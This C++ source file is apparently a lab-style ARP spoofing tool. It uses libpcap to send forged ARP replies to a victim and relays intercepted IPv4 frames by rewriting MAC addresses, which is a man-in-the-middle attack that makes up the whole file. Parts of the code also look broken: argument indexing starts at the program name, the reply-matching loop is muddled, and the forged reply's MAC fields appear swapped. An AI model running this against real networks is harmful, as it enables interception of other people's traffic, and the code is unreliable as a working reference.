#include <pcap.h>
#include <cstdio>
#include <stdint.h>
#include <stdlib.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <cstring>
#include <libnet.h>
#include <pthread.h>

typedef struct arp {
    libnet_ethernet_hdr eth;
    uint16_t h_type;
    uint16_t p_type;
    uint8_t h_size;
    uint8_t p_size;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
    uint8_t pad[12];
} arp;

typedef struct copy_ip{
	char sender_ip[16];
    char target_ip[16];
} copy_ip;

pcap_t* fp;

void usage() {

    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp ens33 192.168.0.15 192.168.0.178\n");

}

void insert_ip(uint8_t* dst, char* src) {
    int i, j;
    char* src_ip = src;
    for (i = 0; i < 4; ++i) {
        for (j = 0; src_ip[j] != '.' && src_ip[j] != NULL; ++j);
        dst[i] = atoi(src_ip);
        src_ip = &src_ip[j + 1];
    }
}

uint16_t my_ntohs(uint16_t num) {
    return ((num & 0xff00) >> 8) + ((num & 0xff) << 8);
}

void mac_eth0(uint8_t* dst, char *dev)
{

    int s, i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);

    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);

    memcpy(dst, &ifr.ifr_hwaddr.sa_data, 6);

}

void *send_arp_packet(void *spoofing){

	while(true)
    {
        struct pcap_pkthdr* header;
        const uint8_t* data;
		arp *packet;
        int res = pcap_next_ex(fp, &header, &data);
		arp *spoof = (arp *)spoofing;
		if (res == 0) continue;
        if (res == -1 || res == -2) break;
		packet = (arp*)data;
		
        if (my_ntohs(packet->eth.ether_type) == 0x0800) {

			memcpy(packet->eth.ether_dhost, spoof->sender_mac, 6);
			memcpy(packet->eth.ether_shost, spoof->target_mac, 6);

			if(pcap_sendpacket(fp, (u_char*)packet, header->caplen) == -1){
				break;
			}

		}else if(my_ntohs(packet->eth.ether_type) == 0x0806){

			pcap_sendpacket(fp, (u_char*)spoofing, sizeof(arp));

		}

	}

}

int main(int argc, char* argv[], char* envp[]) {

	char errbuf[PCAP_ERRBUF_SIZE];
    char* dev = argv[1];
    char sender_ip[16];
    char target_ip[16];
    uint8_t my_mac[6];
    uint8_t is_target;
    int i, j;
	int snum = 0;
    struct pcap_pkthdr* header;
    const uint8_t* data;
    arp* packet;
    arp* send;
    arp* spoofing;
	pthread_t *tid;
	copy_ip *arp_ip;
	void *arg;

    setvbuf(stdin, 0LL, 1, 0LL);
    setvbuf(stdout, 0LL, 1, 0LL);

    if (argc < 4) {
        usage();
        return -1;
    }

    fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (fp == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
	
	snum = (argc-1)/2;

	arp_ip = (copy_ip *)malloc(sizeof(copy_ip)*snum);

	for ( i=0; i<snum; i++){
		memcpy(arp_ip[i].sender_ip, argv[i*2], 15);
		memcpy(arp_ip[i].target_ip, argv[i*2+1], 15);
	}

    send = (arp*)malloc(sizeof(arp)*snum);

    mac_eth0(my_mac, dev);

	for ( i=0; i<snum; i++){

    	memset(send[i].eth.ether_dhost, 0xff, 6);
    	memcpy(send[i].eth.ether_shost, my_mac, 6);
    	memcpy(send[i].target_mac, my_mac, 6);
    	memset(send[i].sender_mac, 0, 6);

    	send[i].eth.ether_type = my_ntohs(0x0806);
    	send[i].h_type = my_ntohs(1);
    	send[i].p_type = my_ntohs(0x0800);
    	send[i].h_size = 6;
    	send[i].p_size = 4;

    	send[i].opcode = my_ntohs(1);
    	insert_ip(send[i].sender_ip, arp_ip[i].sender_ip);
    	insert_ip(send[i].target_ip, arp_ip[i].target_ip);
	}

    while (true) {

        pcap_sendpacket(fp, (u_char*)send, sizeof(arp));
        int res = pcap_next_ex(fp, &header, &data);

        if (res == -1 || res == -2) break;
        if (!data) continue;

        packet = (arp*)data;

        if (my_ntohs(packet->eth.ether_type) == 0x0806) {

            if (my_ntohs(packet->opcode) == 2) {

                is_target = true;

                for (i = 0; i < 4; ++i) {

					for( j=0; j<snum; j++){

                    	if (packet->sender_ip[i] != send[j].target_ip[i]) {
                        	is_target = false;
                        	break;
                    	}

                    	if (packet->target_ip[i] != send[j].sender_ip[i]) {
                        	is_target = false;
                        	break;
                    	}
					}
                }
                if (is_target) break;
            }
        }
    }

    spoofing = (arp*)malloc(sizeof(arp)*snum);

	for ( i=0; i<snum; i++){

    	spoofing[i].eth.ether_type = my_ntohs(0x0806);
    	spoofing[i].h_type = my_ntohs(1);
    	spoofing[i].p_type = my_ntohs(0x0800);
    	spoofing[i].h_size = 6;
    	spoofing[i].p_size = 4;
    	spoofing[i].opcode = my_ntohs(2);

    	memcpy(spoofing[i].eth.ether_dhost, packet->sender_mac, 6);
    	memcpy(spoofing[i].eth.ether_shost, my_mac, 6);
    	memcpy(spoofing[i].target_mac, my_mac, 6);
    	memcpy(spoofing[i].sender_mac, packet->sender_mac, 6);

    	insert_ip(spoofing[i].sender_ip, arp_ip[i].sender_ip);
    	insert_ip(spoofing[i].target_ip, arp_ip[i].target_ip);

	}

	tid = (pthread_t *)malloc(sizeof(pthread_t)*snum);

	
    while (true) {

        printf("send arp packet\n");

		for ( i=0; i<snum; i++){
			//arg = spoofing[i];
			pthread_create(&tid[i],NULL,send_arp_packet, (void *)(&spoofing[i]));

		}

		for ( i=0; i<snum; i++){

			pthread_join(tid[i],NULL);

        }
    }
}
